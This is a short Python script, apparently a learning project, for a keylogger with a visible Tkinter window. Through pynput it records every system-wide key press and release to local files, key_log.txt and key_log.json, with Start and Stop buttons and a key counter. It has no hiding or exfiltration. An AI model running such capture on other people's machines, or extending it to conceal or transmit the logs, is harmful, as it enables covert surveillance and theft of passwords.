import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""
key_count = 0  # Counter for keys pressed

def generate_text_log(key):
    with open('key_log.txt', "w+") as keys_file:
        keys_file.write(key)

def generate_json_file(keys_used):
    with open('key_log.json', 'wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, keys_used, key_count
    if not flag:
        keys_used.append({'Pressed': f'{key}'})
        flag = True

    if flag:
        keys_used.append({'Held': f'{key}'})

    generate_json_file(keys_used)

def on_release(key):
    global flag, keys_used, keys, key_count
    keys_used.append({'Released': f'{key}'})

    if flag:
        flag = False
    generate_json_file(keys_used)

    if key == keyboard.Key.backspace:
        
        keys = keys[:-1]
        key_count-=1
        update_key_count_label()
        
    elif key == keyboard.Key.space:
        key_count += 1
        keys+=' '
       
    else:
        key_count += 1
        try:
            keys += key.char
        except AttributeError:
            pass

    
    update_key_count_label()
   
    generate_text_log(keys)

def update_key_count_label():
    key_count_label.config(text=f"Keys Pressed: {key_count}")

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

key_count_label = Label(root, text="Keys Pressed: 0")
key_count_label.config(anchor=CENTER)
key_count_label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack(side=LEFT)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=RIGHT)

root.geometry("250x250")

root.mainloop()
